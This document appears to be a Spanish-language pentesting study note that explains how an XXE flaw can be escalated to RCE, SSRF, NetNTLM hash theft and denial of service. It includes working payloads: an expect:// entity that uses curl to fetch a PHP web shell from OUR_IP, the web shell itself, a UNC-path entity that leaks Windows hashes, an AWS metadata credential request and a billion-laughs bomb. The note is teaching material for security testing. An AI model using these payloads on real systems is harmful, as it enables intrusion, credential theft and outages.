---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - XXE
Fecha de actualización: 2026-07-15
Nota previa: "[[15 - Divulgación de archivos locales]]"
Nota siguiente: "[[17 - Divulgación avanzada de archivos]]"
Area: "[[Web Attacks.base|Web Attacks]]"
---
---

Más allá de leer ficheros, un XXE puede escalar a `RCE`, pivotar a la red interna con `SSRF` o tumbar el servidor con `DoS`. La viabilidad de cada uno varía mucho según el stack — aquí, qué funciona hoy y qué es reliquia.

# XXE a RCE

Conseguir ejecución directa por XXE es **difícil** y depende del entorno. Vías, de más a menos fiable:

1. <mark style="background: #FFB86CA6;">Leer una clave `id_rsa`</mark> y entrar por SSH — la vía más habitual en la práctica (es un [[15 - Divulgación de archivos locales|file read]] con buen objetivo).
2. **Robo de hash NetNTLM en Windows** (ver abajo).
3. El wrapper PHP `expect://`, que ejecuta comandos — pero requiere el módulo `expect` instalado y **habilitado**, algo **raro** en PHP moderno.

Si la app refleja la salida y `expect` está activo, un comando simple:

```xml
<!ENTITY company SYSTEM "expect://id">
```

Para algo más complejo (traer una web shell), el XML se rompe con espacios y ciertos caracteres, así que sustituimos espacios por `$IFS` y evitamos `|`, `>`, `{`:

```shell-session
$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
$ sudo python3 -m http.server 80
```

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root><email>&company;</email></root>
```

Tras el request recibimos la petición de `shell.php` y luego interactuamos con la web shell.

> [!warning]+ Realidad en 2026
> `expect` **no** viene habilitado por defecto en PHP moderno, así que este RCE directo casi nunca funciona. Por eso <mark style="background: #FFB8EBA6;">el XXE se usa sobre todo para leer ficheros y código fuente</mark>, que luego revelan otras vías de RCE (credenciales, claves, deserialización, [[00 - Introducción a Command Injection|command injection]]).

## Robo de hashes NetNTLM (Windows)

En back-ends Windows, apuntar una entidad a una **ruta UNC** en nuestro servidor fuerza al servidor a autenticarse contra nosotros, filtrando su hash `NetNTLMv2`, que capturamos con `Responder` o `impacket-smbserver` y crackeamos/relayeamos:

```xml
<!ENTITY company SYSTEM "\\OUR_IP\share\x">
```

Es una técnica muy viva en pentest interno moderno; convierte un XXE en un pie de entrada al dominio.

# XXE a SSRF

<mark style="background: #8000E1A6;">La entidad externa puede apuntar a una URL en vez de a un fichero</mark>, convirtiendo el XXE en [[00 - Introducción a los ataques server-side|SSRF]]: enumerar puertos internos, acceder a paneles restringidos, o —crítico en cloud— <mark style="background: #FFB86CA6;">golpear el endpoint de metadatos</mark>:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
```

Las técnicas completas de SSRF (bypass de filtros, esquemas alternativos, metadatos AWS/GCP/Azure) están en el módulo de [[00 - Introducción a los ataques server-side|Server-Side Attacks]] y aplican igual vía XXE. Es, con diferencia, la escalada **más rentable hoy** cuando el RCE directo no está disponible.

# XXE a DoS (reliquia)

El clásico *billion laughs* (o *XML bomb*) define entidades que se auto-referencian exponencialmente hasta agotar la memoria:

```xml
<!DOCTYPE email [
  <!ENTITY a0 "DOS">
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!-- ... hasta a10 -->
]>
```

Cada nivel multiplica ×10 el anterior. <mark style="background: #FF5582A6;">Ya **no** funciona en la mayoría de stacks modernos</mark> porque los **parsers XML actuales** (`libxml2`, Xerces con *secure processing*, MSXML) limitan por defecto la profundidad y la expansión de entidades. La protección vive en la **librería XML del backend**, no en el servidor web (Apache/nginx no parsean el cuerpo XML). Consérvalo como prueba de concepto histórica, no como ataque real.

> [!info]+ Jerarquía de impacto realista
> En un pentest 2026, prioriza así lo que un XXE te da: **(1)** lectura de ficheros/código fuente → **(2)** SSRF (metadatos cloud, red interna) → **(3)** robo de hash NetNTLM (Windows) → **(4)** RCE directo (`expect`, raro) → **(5)** DoS (obsoleto). Casi todo el valor está en los dos primeros.

Cuando el fichero rompe el XML o la app no refleja la entidad, pasamos a [[17 - Divulgación avanzada de archivos|técnicas avanzadas (CDATA, error-based)]].

## Referencias

- PortSwigger — [Exploiting XXE to perform SSRF](https://portswigger.net/web-security/xxe#exploiting-xxe-to-perform-ssrf-attacks)
- HackTricks — [XXE to SSRF / RCE](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
- GTFOBins/UNC — robo de hash vía [Responder](https://github.com/lgandx/Responder)
- HTB Academy — *Web Attacks* (base, 2021)
